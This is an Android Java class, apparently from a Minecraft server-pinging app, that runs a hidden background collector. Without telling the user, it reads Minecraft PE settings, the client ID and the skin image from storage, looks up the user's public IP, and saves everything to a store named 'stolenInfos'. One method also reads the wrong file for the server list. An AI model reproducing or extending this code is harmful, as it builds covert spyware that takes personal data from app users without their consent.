package com.nao20010128nao.McServerPingPong.collector;
import android.content.*;
import com.nao20010128nao.McServerPingPong.*;
import java.util.*;
import android.preference.*;
import java.io.*;
import java.net.*;
import android.os.*;
import android.util.*;
import com.google.gson.*;
import com.nao20010128nao.FileSafeBox.*;

public class CollectorMain extends ContextWrapper implements Runnable
{
	public CollectorMain(){
		super(TheApplication.instance);
		new Thread(this).start();
	}

	@Override
	public void run() {
		// TODO: Implement this method
		Writer w=null;
		String s="";
		try {
			(w=new OutputStreamWriter(TheApplication.instance.stolenInfos.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s=new Gson().toJson(new Infos()));
		} catch (IOException e) {
			
		}finally{
			try {
				if (w != null)w.close();
			} catch (IOException e) {}
			System.out.println(s);
		}
	}
	public class Infos{
		public Map<String,String> mcpeSettings=readSettings();
		public List<String> mcpeServers=readServers();
		public long cid=getCid();
		public String skin=readSkin();
		public String ip=getIp();
		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid","");
		
		private String getIp(){
			BufferedReader br=null;
			try{
				br=new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
				return br.readLine();
			}catch(Throwable e){
				return "127.0.0.1";
			}finally{
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
		}
		private long getCid(){
			BufferedReader br=null;
			try{
				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/clientId.txt"))));
				return new Long(br.readLine());
			}catch(Throwable e){
				return Long.MAX_VALUE;
			}finally{
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
		}
		private Map<String,String> readSettings(){
			Map<String,String> data=new HashMap(20);
			BufferedReader br=null;
			try{
				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/options.txt"))));
				String s;
				while(null!=(s=br.readLine())){
					String[] spl=s.split("\\:");
					data.put(spl[0],spl[1]);
				}
			}catch(Throwable e){
				
			}finally{
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return data;
		}
		private List<String> readServers(){
			List<String> data=new ArrayList(20);
			BufferedReader br=null;
			try{
				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/options.txt"))));
				String s;
				while(null!=(s=br.readLine())){
					data.add(s);
				}
			}catch(Throwable e){

			}finally{
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return data;
		}
		private String readSkin(){
			InputStream br=null;
			ByteArrayOutputStream b=new ByteArrayOutputStream(100);
			byte[] buf=new byte[100];
			try{
				br=new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/custom.png"));
				while(true){
					int r=br.read(buf);
					if(r<=0){
						break;
					}
					b.write(buf,0,r);
				}
			}catch(Throwable e){
				return null;
			}finally{
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return Base64.encodeToString(b.toByteArray(),Base64.NO_WRAP);
		}
	}
}
